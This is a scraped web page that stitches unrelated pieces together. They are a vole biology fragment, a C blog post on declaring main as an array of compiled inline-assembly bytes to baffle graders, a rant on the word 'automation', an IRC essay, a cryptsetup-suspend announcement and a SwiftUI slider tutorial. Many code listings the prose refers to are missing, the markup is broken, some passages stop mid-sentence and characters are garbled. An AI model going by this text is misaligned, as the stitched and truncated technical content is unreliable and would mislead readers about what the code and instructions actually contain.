<p>A difference in the number and location of oxytocin receptors in the brains to two vole species — one adapted to life in mountain ecosystems, and the other to life on the plains — appeared to regulate the voles' love lives.&nbsp;</p>  <p>The prairie voles, with more oxytocin receptors in certain areas, mated and stayed together to raise offspring.

  <article>
    <p>It began when my coworker, despite already knowing how to program, was forced to take the intro level Computer Science course at my university. We joked with him about how he needs to make a program that works, but the grading TAs wouldn’t be able to figure out <em>how</em> it works. So that is the requirement, to make a functioning program that completes an assignment while obfuscating it such that the graders think that it shouldn’t work. With this in mind, I started to think through the arsenal of tricks in C that I’ve seen used before and one thing in particular stood out. The idea for this trick I will explain how to accomplish came from a blog with the name <a href="http://mainisusuallyafunction.blogspot.com/">main is usually a function</a> which got me thinking about when would main <em>not</em> be a function? Let’s find out then!</p>

<p>(If you want to download any of the files, <a href="http://jroweboy.github.io/downloads/2015-01-26-when-is-main-not-a-function/sources.zip">you can download a zip of all the files I wrote here</a> Remember that I wrote them on 64-bit Linux and you’ll need to adjust them to work on other platforms I’m guessing)</p>

<p>My problem solving process is typically the same thing I imagine most programmers do. Step 1: Google search about the problem. Step 2: Click every link on the first page that seems relevant. If not solved, try a different query and repeat. Thankfully, the answer to this question came on the very first search on <a href="http://stackoverflow.com/a/2252429/745719">this Stackoverflow answer</a>. Apparently in 1984, a strange program won the IOCCC where main was declared as a <code>short main[] = {...}</code> and somehow this did stuff and printed to the screen! Too bad it was written for a whole different architecture and compiler so there is really no easy way for me to find out what it did, but judging from the fact that it is just a bunch of numbers, I can surmise that the numbers there are just the compiled binary of some short function and the linker when looking for the main function just throws this in the place of it.</p>

<p>With our hypothesis in place, that the code for the program is just the compiled assembly of main function represented as an array, let’s see if we can replicate this by making a small program and seeing if we can do that.</p>

<figure><pre><code data-lang="c"><span>char</span> <span>main</span><span>[]</span> <span>=</span> <span>"Hello world!"</span><span>;</span></code></pre></figure>

<figure><pre><code data-lang="bash"><span>$ </span>gcc <span>-Wall</span> main_char.c <span>-o</span> first
main_char.c:1:6: warning: ‘main’ is usually a <span>function</span> <span>[</span><span>-Wmain</span><span>]</span>
 char main[] <span>=</span> <span>"Hello world!"</span><span>;</span>
      ^
<span>$ </span>./first
Segmentation fault</code></pre></figure>

<p>Alright! It worked! Kinda… So our next goal is we want it to actually print something to the screen. Thinking back to my limited ASM experience, I recalled that there are different sections of the compiled which determine where different things go. The two sections that are most relevant to us are the <code>.text</code> section and the <code>.data</code> section. <code>.text</code> contains all the executable code and it it readonly whereas <code>.data</code> contains readable and writable code, but it’s not executable. In our case, we can only fill in code for the main function, so anything that gets placed in the data section is a no go. We need to find a way to get the string <code>"Hello world!"</code> inside the main function and reference it.</p>

<p>I began by looking into how to print something with as little code as possible. Since I knew the target system is going to be 64-bit Linux, I found that I can call the system write call and it would write out to the screen. Looking back at this now that I’m writing the code, I don’t think that I needed to use Assembly for this, but at the same time, I’m really glad I got to learn what I did. Getting started writing inline GCC ASM was the hardest part, but once I got the hang of it, it started to become easier.</p>

<p>Getting started wasn’t easy though. It turns out that most of the ASM knowledge I could find through Google is all of the following: really old, Intel syntax, and for 32-bit systems. Remember in our scenario, we need the file to compile with a gcc on a 64-bit system, without any special modifications to the compiler flags, so that means there is no special compile flags, nor can we include any custom linking steps and we want to use GCC inline AT&amp;T syntax. Most of my time was spent trying to find information about modern assembly for 64-bit systems! Maybe my Google-fu is lacking :) This part was almost all trial and error. My goal was just use the write syscall to print “Hello world!” to the screen using gcc inline ASM, so why was it so hard? For the people that want to learn how to do this, I recommend the following sites: <a href="https://filippo.io/linux-syscall-table/">Linux syscall list</a>, <a href="http://wiki.osdev.org/Inline_Assembly">Intro to Inline ASM</a>, and <a href="http://asm.sourceforge.net/articles/linasm.html#Syntax">Differences between Intel and AT&amp;T Syntax</a></p>

<p>Eventually my ASM code started to form and I had some code that seemed to work! Remember, my goal is to produce a main that is an array of the ASM that prints Hello World.</p>

<figure><pre><code data-lang="c"><span>void</span> <span>main</span><span>()</span> <span>{</span>
    <span>__asm__</span> <span>(</span>
        <span>// print Hello World

        <span>"movl $1, %ebx;</span><span>\n</span><span>"</span>  <span>/* 1 is stdout and is the first argument */</span>
        <span>"movl $message, %esi;</span><span>\n</span><span>"</span> <span>/* load the address of string into the second argument*/</span>
        <span>"movl $13, %edx;</span><span>\n</span><span>"</span>  <span>/* third argument is the length of the string to print*/</span>
        <span>"syscall;</span><span>\n</span><span>"</span>
        <span>// call exit (so it doesn't try to run the string Hello World)
</span>        <span>// maybe I could have just used ret instead?
</span>        <span>"movl $60,%eax;</span><span>\n</span><span>"</span>
        <span>"xorl %ebx,%ebx; </span><span>\n</span><span>"</span>
        <span>"syscall;</span><span>\n</span><span>"</span>
        <span>// Store the Hello World inside the main function
</span>        <span>"message: .ascii </span><span>\"</span><span>Hello World!</span><span>\\</span><span>n</span><span>\"</span><span>;"</span>
    <span>);</span>
<span>}</span></code></pre></figure>

<figure><pre><code data-lang="bash"><span>$ </span>gcc <span>-Wall</span> asm_main.c <span>-o</span> second
asm_main.c:1:6: warning: <span>return </span><span>type </span>of ‘main’ is not ‘int’ <span>[</span><span>-Wmain</span><span>]</span>

<p>Hurray! It prints! Let’s take a look at the compiled code in hex now, and it should match up one-to-one with the ASM code we wrote. I went ahead and broke down what’s going on in the comments to the side.</p>

<p>That looks like a functioning main to me! Now let’s go and grab the hex contents of it, and dump it in as a string and see if that works. We can get the hex from main by using gdb again. I’m willing to guess that there must be a better way, so maybe someone can post a comment on this and let me know :) The way I did it was to load gdb and print the hex at main like so. Last time we disassembled main, we saw that it was 49 bytes long, so can use the <code>dump</code> command to save the hex to a file:</p>

<figure><pre><code data-lang="bash"><span># example of how to print the hex</span>

<p>Now we have the hex dump, we can convert them all to integers the easiest way that I know of, and that is using python. In python 2.6 and 2.7 you can just use the following to convert it to a convenient array of ints for us to use.</p>

<p>I figure if my bash foo and unix knowledge was greater I could find an easier way to do this, but googling things like “hex dump of compiled function” returns several questions about how to print hex in various languages. Regardless, we now have a comma seperated array of our function, so let’s put that in a new file and see if it works! I went ahead and commented what each of the different values mean.</p>

    I've learned the hard way that using the word <i>automation</i>&nbsp;to
    describe an initiative, project, process, or algorithm is a bad idea.
    Equating automation with artificial intelligence is even worse. Anchoring a
    digital transformation on initiatives driven by automations completely
    misses the point.
  </p>
  <p>
    In this post, I'm going to explain why you should avoid calling it
    automation, or at least, what some of the pitfalls are if you do describe
    the work you're doing as automation.
  </p>
  
  <p><a href="https://1.bp.blogspot.com/--FGVVQ3_rP0/XzkQSANOxdI/AAAAAAAAh-c/4Sjw_ESKNk0iajEHZ4Ubi5_y0E_Q4eGGACLcBGAsYHQ/s576/Why%2BAvoid%2BAutomation.gif"><img alt="Automation Brings Detractors" data-original-height="324" data-original-width="576" src="https://1.bp.blogspot.com/--FGVVQ3_rP0/XzkQSANOxdI/AAAAAAAAh-c/4Sjw_ESKNk0iajEHZ4Ubi5_y0E_Q4eGGACLcBGAsYHQ/s0/Why%2BAvoid%2BAutomation.gif" title="Automation Brings Detractors"></a>
  </p>
  
  <p>
    First, here is a bit of perspective. IT has been automating work for
    decades. Your data integrations are at least partially automated unless all
    you have is an SFTP folder and then perform all the steps to load databases
    manually. Who does that?&nbsp;
  </p>
  
  
  <p>
    Your software build process may not qualify as CI/CD pipelines, but there
    are some aspects of going from code in version control to running the
    application that is almost definitely automated.&nbsp;
  </p>
  <p>
  And yes, your choice of words is essential. What you name an initiative can
  either get executives and employees interested right from the outset or drown
  them in confusing buzzwords and acronyms.&nbsp;
  </p>
  <p>
    "Agile" - a great term! Who doesn't want to be agile? DevOps? Not good at
    all. DevOps was
    <a href="https://theagileadmin.com/what-is-devops/#:~:text=Then%20in%202009%2C%20Patrick%20Debois,Ghent%20that%20lit%20the%20fuse.">first labeled back in 2009</a>, yet we're still defining the term, and most business leaders are still in
    the dark about it.
  </p>
  <div>
    <br>
    
    <h2>
      The Good, the Bad, and the Ugly of Automation
    </h2>
    
    <p>So here's how I break down the use of automation:</p>
    <div>
      <ul>
        <li>
          <b>The good</b> - Executives understand the word and will likely buy
          into initiatives promising automation because they equate it with cost
          reduction and quality improvement.
        </li>
        <li>
          <b>The bad</b> - Automation sets a very high bar. Are you 100%
          automating a workflow or only a percentage of the steps? Will the
          automation be robust and handle 100% of the edge and outlier use
          cases, or is it more of augmentation, and people will need to handle
          some steps or exceptions? Will it scale on day one, or will you have
          to invest in the automation to achieve it?
        </li>
        <li>
          <b>The ugly</b> - Someone or some group in your organization is going
          to equate your efforts to develop or improve automation with their
          loss of job, function, or importance. As soon as you announce, "We're
          automating X," then some people think, "Shit, does that mean I'm out
          of the job?" Even worse is if you hide it from people, and they find
          out about it through hearsay or when you're a sizable percent
          complete. Talk about creating detractors, you've just given a person
          or group plenty of reason to create speed bumps to frontal assaults to
          slow or stop your progress.
        </li>
      </ul>
      &nbsp;&nbsp;
    </div>
    <p>
      Sorry folks, but the bad and ugly outweigh the good on using the word
      automation to describe your initiative.&nbsp;
    </p>
    
    <p>
      I have some advice for CIO and IT leaders on this topic. You may get your
      CFO on board, but they'll throw you out for round two investments if you
      underdeliver on their expected financial results of the automation.
      <a href="http://blogs.starcio.com/2017/03/how-to-handle-detractors-digital-transformation.html">And you'll immediately create detractors</a>
      who will help set an artificially high expectation on the percent and
      quality of the automation to help prove to everyone their value and your
      failure to sufficiently automate.&nbsp;
    </p>
    
    <h2>
      When RPAs are Massive Technical Debt
    </h2>
    
    <p>
      Let me add one more dimension to this rant and bring up one issue around
      robotic process automation, i.e., RPAs. Here's where an acronym does help
      IT, because when employees here they are being replaced by robots and
      automation, well, some are going to bring out the pitchforks and torches.
    </p>
    
    <p>The real problem is that RPA = code!&nbsp;</p>
    
    <p>
      You might be using a tool like UIPath, BluePrism, or Automation Anywhere
      to generate it, but don't fool yourself. That bot has code behind it. That
      automation will likely need maintenance whenever the tools, screens, or
      data that it depends on changes.
    </p>
    
    <p>
      Now sometimes, the RPA is automating work from tools and screens that your
      organization does not own or control. Perhaps accounting has to go update
      three different third-party systems with updates on an order? These are my
      "good" RPAs as they clearly remove toil from a job that you can't fully
      optimize.
    </p>
    
    <p>
      But what if your RPA is automating your own organization's tools,
      processes, or data? Well, that's code on top of code! Twice the tech debt
      to manage. While implementing an RPA may still have good business and
      technical merits, don't lose sight of the down-the-road impacts when you
      finally decide to upgrade legacy systems.
    </p>
    
    <h2>
      Avoid Setting False Expectations with Automation
    </h2>
    
    <p>
      If you've read this far, then great! You're ready for some advice. I'm
      going to provide the first one for free. If you want even better advice
      before the angry mobs come after you, then please sign up for my
      <a href="https://www.starcio.com/driving-digital?SQF_SRC=5nyike_sat-automation-2020-08-17">Driving Digital Newsletter with this link</a>. I'll be sharing additional recommendations in my next newsletter.
    </p>
    
    <p>So here's the most crucial advice:</p>
    
    <p>
      Don't call your project, initiative, program, release, or whatever you're
      working on based on what you are implementing - name it based on your
      goal, targeted impact, or objective!&nbsp;
    </p>
    
    <p>Some examples:</p>
    
    <div>
      <ul>
        <li>
          Automating builds and deploys with CI/CD -&gt; "Deploy applications
          more frequently"
        </li>
        <li>Automating payroll -&gt; "Simplify how employees get paid"</li>
        <li>
          Automating account reconciliations -&gt; "Completing end-of-month
          reconciliations easier"
        </li>
        <li>
          Automating help desk tickets -&gt; "Improving employee experience and
          satisfaction"
        </li>
        <li>
          Automating web scraping -&gt; "Capturing more unstructured data with
          higher quality"
        </li>
      </ul>
      <p>
      Get it? I know this looks superficial, but names mean A LOT! And naming
      things is not enough to avoid all the pitfalls I listed in this post. I
      have five other recommendations to go with it, so if this interests you,
      <a href="https://www.starcio.com/driving-digital?SQF_SRC=5nyike_sat-automation-2020-08-17">please sign up for the newsletter</a>.
    </p></div>
    
    <p>
      One last thought. Avoid labeling your investments in automation as
      artificial intelligence or anchoring digital transformations with
      automation investments. You'll have to wait for another post or two on
      these points.

<p>Similar to how <a href="https://www.paritybit.ca/blog/why-email-is-the-best-discussion-platform">I think e-mail is still the best discussion platform</a>, I think there is still a solid place for IRC in our lives.</p>
<p>IRC (Internet Relay Chat) is a communications protocol <a href="https://daniel.haxx.se/irchistory.html">created in 1988</a> and, yeah, it shows. IRC is 100% plain text; no images, no videos, no stickers, no emoji reactions, just good ol’ plain text. It was also designed to transmit everything in plain text (i.e. unencrypted) all across the Internets in a time when the use of these computer networks was limited mostly to universities, governments, and large corporations. This was a time when Hollywood-style <a href="https://www.urbandictionary.com/define.php?term=1337%20h4x0r">1337 h4x0rs</a> were pretty much just kids using their modems to make long distance calls for free.</p>
<p>Nowadays, IRC is probably not such a good platform for private personal chats, but that doesn’t mean it’s not good for other things.</p>
<p>Arguably the best “feature” of IRC is that it’s still all in plain text. No multimedia or fancy features such as emoji reactions, integrations, or stickers keeps the bandwidth usage down and the focus on the content of what people are saying, rather than on distracting memes and flashy things. It’s the same reason why people like lean websites, plain text email, plain text notes, and so on: plain text is easy, portable, lean, and pure. You can even still <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat#File_sharing">send files using IRC</a>.</p>
<p>One aspect of computing and software design that many developers nowadays seem to forget is that <a href="https://en.wikipedia.org/wiki/List_of_countries_by_Internet_connection_speeds">over half of the world’s population does not have access to fast Internet</a> and many people, even in developed countries, are limited by bandwidth caps and spotty satellite or mobile Internet access. For these people, IRC can be the much better option compared to other collaboration platforms such as RocketChat, Mattermost, Slack, or Matrix, even if they have to use an IRC bouncer or a screen/tmux session on a remote server to not miss things if their connection is that spotty.</p>
<p>One of the biggest flaws I see people discuss when talking about IRC is that chat history is not saved by the server. This means that, if you want a record of the conversations which happen when you’re not connected, you’d have to use an IRC bouncer or screen/tmux session which will keep you connected when you have to go offline. I can definitely see this being a limitation for a private group chat if this is not something you’re willing to do, but when it comes to open source collaboration or support, this makes IRC great for hashing out ideas, asking quick questions, and having conversations while hacking on things. In these cases you don’t really care what’s happening when you’re not there because these are synchronous conversations which is perfect for the ephemeral nature of IRC.</p>
<p>Even though encryption is not mandated by IRC or enabled by default in many cases, you can still enforce encrypted client-server or server-server connections on your IRC server. This means that all messages in transit between clients and your server would be encrypted (usually with TLS) and the only weakness would be logs on the servers themselves or logs on client machines. If you and your friends like the plain text medium, it’s entirely possible to set up an IRC server which mandates encryption and doesn’t store logs long-term. If you’re in a group of people you can trust to be competent then it’s entirely possible to make IRC work this way and have a reasonable guarantee of privacy and security.</p>
<p>I suppose I should also mention the federating aspect of IRC since that’s quite a hot topic in the open source social platform world. IRC does federate in a way, but it’s not quite like the way Pleroma or Mastodon do. In the world of IRC, IRC networks are made up of one or more IRC servers. If you connect to an IRC server, you can view and interact with any channels or users on the same network that server is a part of. The way IRC exists right now is due to several network splits (netsplits) where many servers decided to split off of a big network to form their own, separate network several times throughout IRC history. This is similar to having a group of several Mastodon/Pleroma instances which have decided to federate with nobody else except those also in the group and is why we have the Freenode IRC network alongside the Undernet, EFnet, and so on.</p>
<p>The reason why this isn’t really such a big issue when it comes to IRC though is that IRC doesn’t really have accounts. Sure, you can usually register a nickname with a network’s NickServ bot to reserve it, but that’s not mandatory on most networks. This means you can join however many IRC networks you want with little hassle; you just have to connect and set your nick.</p>
<p>So, overall, IRC is still a really useful and good platform especially for software minimalists and technical users who wish to have a relatively hassle-free experience. IRC is great for open collaboration and quick support in free software projects (far better than Slack or Discord) and it can be made to work for private chats as long as you can trust everyone in the group to be competent. Yes, IRC is not necessarily great for non-technical users or those who require extensive guarantees of security; it might even be too much of a hassle for you, but this doesn’t mean it’s dead, useless, or outdated. IRC is not only still useful, but can still be the best tool for the job in the modern age. There are also improvements coming in the form of <a href="https://ircv3.net/">IRCv3</a>.</p>

<h2 id="Introducing_cryptsetup-suspend"><a name="index1h2"></a>Introducing cryptsetup-suspend</h2>

<p>Today, we're introducing <code>cryptsetup-suspend</code>, whose job is to protect the content of your harddrives while the system is sleeping.</p>

<p><strong>TL;DR:</strong></p>

<ul>
<li>You can lock your encrypted harddrives during suspend mode by <a href="#index6h2">installing <code>cryptsetup-suspend</code></a></li>
<li>For <code>cryptsetup-suspend</code> to work properly, at least Linux kernel 5.6 is required</li>
<li>We hope that in a bright future, everything will be available out-of-the-box in Debian and it's derivatives</li>
</ul>


<p><strong>Before:</strong></p>

<p><img src="https://blog.freesources.org/images/timeline_old.svg" alt="timeline_old.svg"></p>

<p><strong>After:</strong></p>

<p><img src="https://blog.freesources.org/images/timeline_new.svg" alt="timeline_new.svg"></p>

<h2 id="Table_of_contents"><a name="index2h2"></a>Table of contents</h2>




<h2 id="What_does_this_mean_and_why_should_you_care_about_it.3F"><a name="index3h2"></a>What does this mean and why should you care about it?</h2>

<p>If you don't use full-disk encryption, don't read any further. Instead, think about, what will happen if you lose your notebook on the train, a random person picks it up and browses through all your personal pictures, e-mails, and tax records. Then encrypt your system and come back.</p>

<p>If you believe full-disk encryption is necessary, you might know that it only works when your machine is powered off. Once you turn on the machine and decrypt your harddrive, your encryption key stays in RAM and can potentially be <a href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e">extracted by malicious software or physical access</a>. Even if these attacks are non-trivial, it's enough to worry about. If an attacker is able to extract your disk encryption keys from memory, they're able to read the content of your disk in return.</p>

<p>Sadly, in 2020, we hardly power off our laptops anymore. The sleep mode, also known as "suspend mode", is just too convenient. Just close the lid to freeze the system state and lift it anytime later in order to continue. Well, convenience usually comes with a cost: during suspend mode, your system memory is kept powered, all your data - including your encryption keys - stays there, waiting to be extracted by a malicious person.&nbsp; Unfortunately, there are <a href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e">practical attacks</a> to extract the data of your powered memory.</p>

<p>Cryptsetup-suspend expands the protection of your full-disk encryption to all those times when your computer sleeps in suspend mode. Cryptsetup-suspend utilizes the suspend feature of <a href="https://gitlab.com/cryptsetup/cryptsetup/blob/master/README.md">LUKS</a> volumes and integrates it with your Debian system. Encryption keys are evicted from memory before suspend mode and the volumes have to be re-opened after resuming - potentially prompting for the required passphrases.</p>

<p>By now, we have a working prototype which we want to introduce today. We did quite some testing, both on virtualized and bare-metal Debian and Ubuntu systems, with and without graphical stack, so we dare to unseal and set free the project and ask you - the community - to test, review, criticize and give feedback.</p>

<p><strong>Here's a screencast of <code>cryptsetup-suspend</code> in action:</strong></p>

<h2 id="State_of_the_implementation.3A_where_are_we.3F"><a name="index4h2"></a>State of the implementation: where are we?</h2>

<p>If you're interested in the technical details, here's how <code>cryptsetup-suspend</code> works internally. It basically consists of three parts:</p>

<p><img src="https://blog.freesources.org/images/cryptsetup-suspend.svg" alt="cryptsetup-suspend.svg"></p>

<ol>
<li><code>cryptsetup-suspend</code>: A C program that takes a list of LUKS devices as arguments, suspends them via <code>luksSuspend</code> and suspends the system afterwards. Also, it tries to reserve some memory for decryption, which we'll explain below.</li>
<li><code>cryptsetup-suspend-wrapper</code>: A shell wrapper script which works the following way:

<ol>
<li>Extract the initramfs into a ramfs</li>
<li>Run (systemd) pre-suspend scripts, stop udev, freeze almost all <a href="https://en.wikipedia.org/wiki/Cgroups">cgroups</a></li>
<li>Chroot into the ramfs and run <code>cryptsetup-suspend</code></li>
<li>Resume initramfs devices inside chroot after resume</li>
<li>Resume non-initramfs devices outside chroot</li>
<li>Thaw groups, start udev, run (systemd) post-suspend scripts</li>
<li>Unmount the ramfs</li>
</ol>
</li>
<li>A systemd unit drop-in file overriding the <code>Exec</code> property of <code>systemd-suspend.service</code> so that it invokes the script <code>cryptsetup-suspend-wrapper</code>.</li>
</ol>


<p>Reusing large parts of the existing cryptsetup-initramfs implementation has some positive side-effects: Out-of-the-box, we support all LUKS block device setups that have been supported by the Debian cryptsetup packages before.</p>

<p>Freezing most processes/cgroups is necessary to prevent possible race-conditions and dead-locks after the system resumes. Processes will try to access data on the locked/suspended block devices eventually leading to buffer overflows and data loss.</p>

<h2 id="Technical_challenges_and_caveats"><a name="index5h2"></a>Technical challenges and caveats</h2>

<ul>
<li><strong>Dead-locks at suspend</strong>: In order to prevent possible dead-locks between suspending the encrypted LUKS disks and suspending the system, we have to tell the Linux kernel to <em>not</em> <code>sync()</code> before going to sleep. A <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c052bf82c6b00ca27aab0859addc4b3159dfd3a4">corresponding patch</a> got accepted upstream in Linux 5.6. See section <a href="#What_about_the_kernel_patch.3F">What about the kernel patch?</a> below for details.</li>
<li><strong>Race conditions at resume</strong>: Likewise, there's a risk of race conditions between resuming the system and unlocking the encypted LUKS disks. We went with freezing as many processes as possible as a counter measurement. See last part of section <a href="#State_of_the_implementation.3A_where_are_we.3F">State of the implementation: where are we?</a> for details.</li>
<li><strong>Memory management</strong>: Memory management is definitely a challenge. Unlocking disks might require a lot of memory (if <a href="https://en.wikipedia.org/wiki/Key_derivation_function">key derivation function</a> is argon2i) and the swap device most likely is locked at that time. See section <a href="#All_that_matters_to_me_is_the_memories.21">All that matters to me is the memories!</a> below for details.</li>
<li><strong>systemd dependency</strong>: Our implementation depends on systemd. It uses a unit drop-in file for <code>systemd-suspend.service</code> for hooking into the system suspend process and depends on systemds cgroup management to freeze and thaw processes. If you're using a different init system, sorry, you're currently out of luck.</li>
</ul>


<h3 id="What_about_the_kernel_patch.3F"><a name="index1h3"></a>What about the kernel patch?</h3>

<p>The problem is simple: the Linux kernel suspend implementation enforces a <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/power/suspend.c?h=v5.5#n569">final filesystem sync() before the system goes to sleep</a> in order to prevent potential data loss. While that's sensible in most scenarios, it may result in dead-locks in our situation, since the block device that holds the filesystem is already suspended. The <code>fssync()</code> call will block forever as it waits for the block device to finish the <code>sync()</code> operation. So we need a way to conditionally disable this <code>sync()</code> call in the Linux kernel resume function. That's what <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c052bf82c6b00ca27aab0859addc4b3159dfd3a4">our patch</a> does, by introducing a run-time switch at <code>/sys/power/sync_on_suspend</code>, but it only got accepted into the Linux kernel recently and was first released with Linux kernel 5.6.</p>

<p>Since release 4.3, the Linux kernel at least provides a build-time flag to disable the <code>sync()</code>: <code>CONFIG_SUSPEND_SKIP_SYNC</code> (that was called <code>SUSPEND_SKIP_SYNC</code> first and renamed to <code>CONFIG_SUSPEND_SKIP_SYNC</code> in kernel release 4.9). Enabling this flag at build-time protects you against the dead locks perfectly well. But while that works on an individual basis, it's a non-option for the distribution Linux kernel defaults. In most cases you still want the <code>sync()</code> to happen, except if you have user-space code that takes care of the <code>sync()</code> just before suspending your system - just like our <code>cryptsetup-suspend</code> implementation does.</p>

<p>So in order to properly test <code>cryptsetup-suspend</code>, you're strongly advised to run Linux kernel 5.6 or newer. Fortunately, Linux 5.6 is available in <code>buster-backports</code> thanks to the Debian Kernel Team.</p>

<h3 id="All_that_matters_to_me_is_the_memories.21"><a name="index2h3"></a>All that matters to me is the memories!</h3>

<p>One of the tricky parts is memory management. Since version 2, LUKS uses argon2i as default key derivation function. Argon2i is a memory-hard hash function and LUKS2 assigns the minimum of half of your systems memory or 1 GB to unlocking your device. While this is usually unproblematic during system boot - there's not much in the system memory anyway - it can become problematic when suspending. When cryptsetup tries to unlock a device and wants 1 GB of memory for this, but everything is already occupied by your browser and video player, there's only two options what to do:</p>

<ol>
<li>Kill a process to free some memory</li>
<li>Move some of the data from memory to swap space</li>
</ol>


<p>The first option is certainly not what you expect when suspending your system. The second option is impossible, because swap is located on your harddrive which we have locked before. Our current solution is to allocate the memory after freezing the other processes, but before locking the disks. At this time, the system can still move data to swap, but it won't be accessed anymore. We then release the memory just in time for cryptsetup to claim it again. The implementation of this is still subject to change.</p>

<p><img src="https://blog.freesources.org/images/memories.gif" alt="memories.gif"></p>

<h3 id="What.27s_missing.3A_A_proper_user_interface"><a name="index3h3"></a>What's missing: A proper user interface</h3>

<p>As mentioned before, we consider <code>cryptsetup-suspend</code> usable, but it certainly still has bugs and shortcomings. The most obvious one is lack of a proper user interface. Currently, we switch over to a tty command-line interface to prompt for passphrases when unlocking the LUKS devices. It certainly would be better to replace this with a graphical user interface later, probably by using plymouth or something alike. Unfortunately, it seems rather impossible to spawn a real graphical environment for the passphrase prompt. That would imply to load the full graphical stack into the ramfs, raising the required amount of memory significantly. Lack of memory is currently our biggest concern and source of trouble.</p>

<p>We'd definitely appreciate to learn about your ideas how to improve the user experience here.</p>

<h2 id="Let.27s_get_practical.3A_how_to_use"><a name="index6h2"></a>Let's get practical: how to use</h2>

<p><strong>TL;DR:</strong> On Debian Bullseye (Testing), all you need to do is to install the <a href="https://packages.debian.org/experimental/cryptsetup-suspend"><code>cryptsetup-suspend</code> package from experimental</a>. It's not necessary to upgrade the other cryptsetup packages. On Debian Buster, cryptsetup packages from backports are required.</p>

<ol>
<li>First, be sure that you're running Linux kernel 5.6 or newer. For Buster systems, it's available in <a href="https://packages.debian.org/buster-backports/linux-image-amd64">buster-backports</a>.</li>
<li>Second, if you're on Debian Buster, install the <a href="https://packages.debian.org/buster-backports/cryptsetup">cryptsetup 2:2.3.3-2~bpo10+1 packages from buster-backports</a>.</li>
<li>Third, install the <a href="https://packages.debian.org/experimental/cryptsetup-suspend"><code>cryptsetup-suspend</code> package from experimental</a>. Beware that <code>cryptsetup-suspend</code> depends on <code>cryptsetup-initramfs (&gt;= 2:2.3.3-1~)</code>. Either you need the cryptsetup packages from <code>testing/unstable</code>, or the backports from <code>buster-backports</code>.</li>
<li>Now that you have the <code>cryptsetup-suspend</code> package installed, everything should be in place: Just send your system to sleep. It should switch to a virtual text terminal before going to sleep, ask for a passphrase to unlock your encrypted disk(s) …</li></ol></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>With the iOS 13 release Apple has introduced a new tool - <a rel="nofollow" href="https://developer.apple.com/xcode/">SwiftUI</a>, calling it â€œan innovative, exceptionally simple way to build user interfaces across all Apple platforms with the power of Swiftâ€�.  Released on September 19th, it remains one of the hottest news in October with a number of useful and easy to follow  <a rel="nofollow" href="https://developer.apple.com/tutorials/swiftui">examples and tutorials</a> have been published alongside it. Indeed, developing and implementing simple interfaces seems intuitive and fast. What about creating something more exciting?</p>
<p>We are going to try implementing <a rel="nofollow" href="https://github.com/Cuberto/liquid-swipe">LiquidSwipe</a> using <strong>SwiftUI</strong> - a slider for switching between pages with a beautiful animation that could be used for flicking through stories in iOS  apps with social features or for navigation through an onboarding.</p>
<p><img src="https://exyte.com/upload/liquid_swipe_brighter-compressed.gif" alt="" title="SwiftUI slider example"></p><p>SwiftUI slider example</p>
<h2>LiquidSwipeView for a SwiftUI slider</h2>
<p>We need a new View that will represent our control:</p>

<p><code>View</code> will display the content of the current page, as well as two sliders on both sides for changing pages:</p>

<p><code>ZStack</code> is a simple container that displays its contents on top of each other, which makes it perfectly suited for creating overlapping elements in SwiftUI. In this tutorial, the left and right sliders are situated above the main page.</p>
<p><code>edgesIgnoringSafeArea()</code> lets us render the contents on the whole area of the visible interface, ignoring, well, the safe area. </p>
<p>Slider parameters are represented with state <em>variables</em>, described later in the tutorial:</p>

<p>Noteworthy, unlike the original framework by <em>Cuberto</em>, we wanted to try implementing two sliders with SwiftUI. Due to this, we have to define the side of the slider we are referencing:</p>

<h2>Content</h2>
<p>In our simple example each page is just an empty colored rectangle:</p>

<p>All available page background colors are defined in an array of constants - <code>Config.colors</code>. In the code example below, we select the current page using the <code>pageIndex</code> variable:</p>

<p><code>@State</code> variables are a very powerful SwiftUI feature, where the user interface is automatically reloaded after the variable changes. For example, in this case it means that setting <code>pageIndex = 1</code> will prompt the page change and a UI update.</p>
<h2>Silder inplementation with SwiftUI</h2>
<p>Letâ€™s check the slider implementation:</p>

<p>The first point of interest is the type of the data variable - <code>Binding&lt;SliderData&gt;</code>. In SwiftUI, it means that we not only have access to the value of the variable, but can change the value as well. Note that there is something new here, a dollar sign next to the name of the value:</p>

<p>We use thisfeature in the wave method, which sets the shape of the slider so the interface would have that liquid look. In other cases we retrieve the value by calling <code>data.wrappedValue</code>.</p>
<p>So far, the slider uses a <code>ZStack</code> and includes a wave and a button. Additionally we define two more container parameters which we shall discuss in detail:</p>

<p>By changing <code>zIndex</code> we can set the order of the elements in the <code>ZStack</code>. We control it using the <code>topSlider</code> variable:</p>

<p>This variable represents the slider that is currently on top. When we interact with either slider, we set this variable to show the active slider above the other.</p>

<p><code>offset</code> lets us move the slider a bit to the right or to the left. We define the following state variable:</p>

<p>The slider does not have an offset most of the time. However, during the page change animation we hide the new sliders by setting <code>sliderOffset = 100</code>, and then revert this value to display the sliders. Apple made it quite simple to create this animation using SwiftUI:</p>

<p><img src="https://exyte.com/upload/1.gif" alt="" title="SwiftUI animation"></p><p>SwiftUI animation</p>
<p>By default, iOS uses linear animation. However we can customize it using <code>withAnimation</code> parameters:</p>
<p>
Look how nice spring animation looks:</p>
<p><img src="https://exyte.com/upload/2.gif" alt="" title="SwiftUI spring animation"></p><p>SwiftUI spring animation</p>
<h2>Button</h2>
<p>The button consists of a gray circle and a white arrow that is backed up by simple math:</p>

<p>During the definition of the <code>ZStack</code> contents the center of the button is situated in the (0, 0) point. After that we use the offset method to move the button to the desired point (which is calculated using <code>SliderData</code> - it will be described a bit later). By doing this, we automatically set the transparency of the button - the further we move the slider, the more transparent it gets. </p>
<p><img src="https://exyte.com/upload/Untitled-1.gif" alt="" title="SwiftUI button animation"></p><p>SwiftUI button animation</p>
<h2>Wave</h2>
<p>We use a separate object for presenting the wave - <code>WaveView</code>. It is created (and set up with the background and gestures) in the wave method:</p>

<p>The index function returns the index of the next (or previous) page - depending on the side of the slider. It also handles switching between the first and the last page:</p>

<p>Now we need to define 3 gestures:
Getting hold of the slider and switching the page, during which the wave is updated.
